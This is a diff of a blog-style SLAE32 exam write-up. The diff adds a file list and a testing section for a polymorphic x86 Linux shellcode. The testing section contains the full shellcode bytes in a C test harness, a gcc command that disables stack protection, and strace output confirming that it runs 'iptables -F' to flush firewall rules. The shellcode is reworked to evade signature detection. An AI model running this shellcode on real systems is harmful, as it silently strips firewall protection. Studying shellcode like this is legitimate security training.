@@ -45,8 +45,9 @@ In this part I'll create a polymorphic version of the 3rd shellcode.
 
 The files for this part of the assignment are the following:
 
-- [original_shellcode.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/original_shellcode.nasm)
-- [polymorphic_shellcode.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/polymorphic_shellcode.nasm)
+- [original_shellcode.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/original_shellcode.nasm), the original shellcode taken from Shell-Storm
+- [polymorphic_shellcode.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/polymorphic_shellcode.nasm), my polymorphic version of the shellcode above
+- [test_polymorphic_shellcode.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/test_polymorphic_shellcode.nasm), a `C` program for testing the polymorphic shellcode
 
 ## Analysis
 
@@ -345,3 +346,42 @@ Next, I replaced the instruction `mov ecx,esp` with two instructions, using the 
 Compared to the original shellcode, I didn't have to clear EDX, as it was already cleared from the start (by means of `mul ebx`).
 
 The last instruction is identical to the one from the original shellcode.
+
+### Testing
+
+To test the polymorphic shellcode, I've used the following C program:
+
+```cpp
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] = \
+"\x31\xdb\xf7\xe3\x52\x66\xbf\x2d\x46\x66\x57\x89\xe7\x52\xbe\x74\x63\x62\x72\x52\x68\x62\x6c\x65\x73\x68\x1d\x13\x16\x13\x31\x34\x24\x68\x62\x69\x6e\x2f\x68\x5b\x4c\x4d\x01\x31\x34\x24\x54\x5b\x52\x57\x53\xb0\x0a\x40\x54\x59\xcd\x80";
+
+main()
+{
+    printf("Shellcode length: %d\n", strlen(code));
+
+    int (*ret)() = (int(*)())code;
+    ret();
+}
+```
+
+To compile:
+
+```bash
+gcc -fno-stack-protector -z execstack -o test_polymorphic_shellcode test_polymorphic_shellcode.c
+```
+
+Once I've run it, I could confirm it executes `iptables -F` successfully:
+
+```bash
+rbct@slae:~/exam/assignment_6/3$ sudo strace -e trace=execve ./test_polymorphic_shellcode 
+# execve("./test_polymorphic_shellcode", ["./test_polymorphic_shellcode"], [/* 16 vars */]) = 0
+# Shellcode length: 58
+# execve("///sbin/iptables", ["///sbin/iptables", "-F"], [/* 0 vars */]) = 0
+
+rbct@slae:~/exam/assignment_6/3$
+```
+
+As you can see, it confirms the length of the shellcode is `58 bytes`. More important is the last `execve` syscall. It executed the command `///sbin/iptables -F` and returned `0`, meaning it succeeded.
